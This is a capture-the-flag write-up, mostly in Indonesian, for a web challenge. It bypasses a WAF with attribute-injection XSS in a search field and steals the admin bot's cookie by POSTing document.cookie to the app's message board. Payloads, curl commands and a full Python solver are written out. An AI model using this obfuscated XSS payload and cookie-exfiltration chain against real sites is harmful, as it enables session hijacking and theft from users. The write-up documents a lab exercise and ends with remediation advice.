# CTF Writeup — Cov Books

**Event:** RAM CTF  
**Category:** Web  
**Difficulty:** Medium  
**Flag:** `RAM{4ttr_1nj3ct_w4f_byp4ss_1br4ry}`

---

## Challenge Description

> The Coventry Digital Library lets students search the book catalogue by title, author, or genre.
>
> The team recently added a WAF after an incident. They're confident it blocks all injection attempts.

**URL:** `http://10.42.5.10`

---

## Reconnaissance

### Step 1 — Enumerate the Main Pages

Halaman utama menampilkan katalog buku dan sebuah fitur pencarian dengan parameter `q`.

Di navbar juga ada halaman lain yang menarik:

- `/report.php`
- `/messages.php`

`/report.php` menerima URL lalu mengirimkannya ke admin internal untuk direview.  
`/messages.php` menampilkan balasan atau pesan yang masuk.

### Step 2 — Understand the Search Reflection

Input `q` direfleksikan kembali ke atribut `value` pada elemen input pencarian:

```html
<input type="text" name="q" value="USER_INPUT" placeholder="Search by title, author or genre…">
```

Saat payload HTML tag biasa dicoba, WAF memblokirnya:

```html
"?><script>alert(1)</script>
```

Tetapi WAF ternyata tidak memblokir **attribute injection**. Payload seperti ini lolos:

```html
" autofocus onfocus=alert(1) x="
```

Dan dirender menjadi:

```html
<input type="text" name="q" value="" autofocus onfocus=alert(1) x="" placeholder="Search by title, author or genre…">
```

Artinya kita bisa keluar dari atribut `value` dan menambahkan atribut/event handler baru ke elemen input.

### Step 3 — Inspect the Message Sink

Halaman `/messages.php` awalnya terlihat seperti message board biasa.  
Setelah diuji, endpoint ini ternyata menyimpan pesan lewat **POST**, bukan lewat query string.

Contoh:

```bash
curl -i -X POST http://10.42.5.10/messages.php -d 'msg=test123'
```

Lalu `test123` muncul di daftar message.

Ini penting karena nanti XSS bisa dipakai untuk mengirim data hasil curian ke message board itu sendiri.

### Step 4 — Understand the Admin Visit Flow

`/report.php` hanya menerima URL internal challenge, dengan petunjuk:

- `http://web/`
- `http://localhost:8080/`

Berarti ada admin bot yang akan membuka URL internal tersebut.  
Kalau kita bisa membuat admin membuka halaman dengan payload XSS, maka JavaScript akan dieksekusi dalam konteks admin.

---

## Exploitation

### Step 5 — Build a WAF Bypass XSS Payload

Karena payload ditempatkan di atribut tanpa quote tambahan pada event handler, JavaScript harus dibuat tanpa string literal biasa agar parser HTML tidak rusak.

Payload final:

```html
" autofocus onfocus=fetch(String.fromCharCode(47,109,101,115,115,97,103,101,115,46,112,104,112),{method:String.fromCharCode(80,79,83,84),body:new(URLSearchParams)({msg:document.cookie})}) x="
```

Tujuan payload:

1. keluar dari `value="..."`
2. menambahkan `autofocus`
3. menambahkan `onfocus=...`
4. saat admin membuka halaman, browser admin otomatis fokus ke input
5. event `onfocus` mengeksekusi `fetch()` ke `/messages.php`
6. data yang dikirim adalah `document.cookie`

Payload di-URL-encode lalu disisipkan ke URL berikut:

```text
http://localhost:8080/?q=<payload>
```

### Step 6 — Send the Payload to Admin

```bash
curl -X POST http://10.42.5.10/report.php \
  --data-urlencode 'url=http://localhost:8080/?q=%22%20autofocus%20onfocus%3Dfetch(String.fromCharCode(47,109,101,115,115,97,103,101,115,46,112,104,112),%7Bmethod%3AString.fromCharCode(80,79,83,84),body%3Anew(URLSearchParams)(%7Bmsg%3Adocument.cookie%7D)%7D)%20x%3D%22'
```

Admin bot mengunjungi URL tersebut, payload berjalan, lalu cookie admin dipost ke `/messages.php`.

### Step 7 — Read the Leaked Cookie

Setelah dipoll dari `/messages.php`, muncul pesan berikut:

```text
flag%3DRAM%7B4ttr_1nj3ct_w4f_byp4ss_1br4ry%7D
```

Itu adalah cookie yang masih URL-encoded.

Decode hasilnya:

```text
flag=RAM{4ttr_1nj3ct_w4f_byp4ss_1br4ry}
```

Sehingga flag-nya adalah:

```text
RAM{4ttr_1nj3ct_w4f_byp4ss_1br4ry}
```

---

## Flag

```text
RAM{4ttr_1nj3ct_w4f_byp4ss_1br4ry}
```

---

## Solver

Berikut solver Python yang mereproduksi exploit tanpa perlu langkah manual:

```python
#!/usr/bin/env python3
import html
import re
import sys
import time
from urllib.parse import quote, unquote
from urllib.request import Request, urlopen

BASE_URL = "http://10.42.5.10"

def http_request(path, method="GET", data=None, timeout=10):
    url = f"{BASE_URL}{path}"
    body = None
    headers = {}
    if data is not None:
        body = data.encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    req = Request(url, data=body, method=method, headers=headers)
    with urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", errors="replace")

def clear_messages():
    http_request("/messages.php?clear=1")

def build_payload():
    js = (
        "fetch(String.fromCharCode(47,109,101,115,115,97,103,101,115,46,112,104,112),"
        "{method:String.fromCharCode(80,79,83,84),"
        "body:new(URLSearchParams)({msg:document.cookie})})"
    )
    injected = f'\" autofocus onfocus={js} x=\"'
    return quote(injected, safe="")

def submit_report():
    payload = build_payload()
    target = f"http://localhost:8080/?q={payload}"
    data = "url=" + quote(target, safe="")
    return http_request("/report.php", method="POST", data=data)

def extract_entries(page):
    pattern = re.compile(r'<div class=\"entry\">\\[[^\\]]+\\] msg=(.*?)</div>', re.DOTALL)
    return [html.unescape(match) for match in pattern.findall(page)]

def find_flag(entries):
    for entry in entries:
        decoded = unquote(entry)
        flag_match = re.search(r"RAM\\{[^}]+\\}", decoded)
        if flag_match:
            return flag_match.group(0)

        cookie_match = re.search(r"flag=([^;]+)", decoded)
        if cookie_match:
            maybe_flag = unquote(cookie_match.group(1))
            flag_match = re.search(r"RAM\\{[^}]+\\}", maybe_flag)
            if flag_match:
                return flag_match.group(0)
    return None

def poll_flag(max_attempts=20, delay=2):
    for _ in range(max_attempts):
        page = http_request("/messages.php")
        entries = extract_entries(page)
        flag = find_flag(entries)
        if flag:
            return flag
        time.sleep(delay)
    return None

def main():
    clear_messages()
    submit_report()
    flag = poll_flag()
    if not flag:
        print("flag not found", file=sys.stderr)
        sys.exit(1)
    print(flag)

if __name__ == "__main__":
    main()
```

File solver sudah disiapkan sebagai [`solver.py`](/home/nata/ctf/RAM/web/Covbooks/solver.py).

---

## Vulnerability Summary

| # | Vulnerability | Detail |
|---|---|---|
| 1 | **Attribute Injection / Reflected XSS** | Input `q` dimasukkan ke atribut `value` tanpa sanitasi yang benar sehingga attacker bisa menutup atribut dan menambahkan event handler |
| 2 | **Weak WAF Filtering** | WAF hanya memblokir pola HTML/script umum, tetapi gagal mendeteksi injeksi atribut yang lebih sederhana |
| 3 | **Internal Admin Visit Feature** | `report.php` mengizinkan attacker membuat admin membuka URL internal yang berisi payload berbahaya |
| 4 | **Sensitive Cookie in Admin Context** | Flag tersedia di cookie admin dan bisa dicuri melalui XSS |
| 5 | **Exfiltration Sink in Application** | `/messages.php` bisa dipakai sebagai kanal exfil data hasil XSS |

---

## Remediation

1. **Escape output sesuai konteks** — input yang dimasukkan ke atribut HTML harus di-encode khusus untuk konteks atribut
2. **Gunakan CSP yang ketat** — blok inline event handler seperti `onfocus=...`
3. **Jangan expose admin bot ke URL attacker-controlled tanpa isolasi** — gunakan sandbox atau strip script-capable input
4. **Jangan simpan flag/secret di cookie yang bisa diakses JavaScript** — gunakan `HttpOnly`
5. **WAF bukan pengganti secure coding** — filter pola tidak akan cukup kalau sink utamanya tetap vulnerable

---

## Tools Used

- `curl` — enumerasi endpoint dan submit payload ke admin
- Python standard library — membuat solver HTTP sederhana
- Browser parsing knowledge — menyusun payload yang valid untuk konteks atribut unquoted

---

## Attack Flow

```text
Open /
   │
   ▼
Find reflected input in:
<input value="USER_INPUT">
   │
   ▼
Test WAF bypass with attribute injection
   │
   ▼
Discover /report.php and /messages.php
   │
   ▼
Confirm /messages.php stores msg via POST
   │
   ▼
Use /report.php to make admin visit:
http://localhost:8080/?q=<XSS payload>
   │
   ▼
Payload triggers onfocus and POSTs document.cookie
to /messages.php
   │
   ▼
Read leaked cookie from message board
   │
   ▼
Decode:
flag%3DRAM%7B4ttr_1nj3ct_w4f_byp4ss_1br4ry%7D
   │
   ▼
Flag:
RAM{4ttr_1nj3ct_w4f_byp4ss_1br4ry}
```
